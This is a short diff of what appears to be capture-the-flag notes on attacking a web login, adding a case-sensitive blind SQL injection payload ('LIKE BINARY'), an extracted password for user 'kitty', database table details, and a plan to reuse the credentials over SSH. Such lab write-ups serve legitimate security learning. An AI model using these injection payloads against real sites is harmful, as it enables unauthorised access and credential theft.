@@ -27,11 +27,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## HTTP (port 80)
 kitty' AND 1=1#
 
-kitty' AND password LIKE '%'
+kitty' AND password LIKE BINARY '%'
 
--> l0ng_liv3_kitty
+we add the binary cause LIKE is case insensitive
+we will use kitty and password to connect to SSH
+
+-> L0ng_Liv3_KittY
 
 dbname : mywebsite
 
 table: siteusers
 fields: id,username,password,created_at
+
+
+we
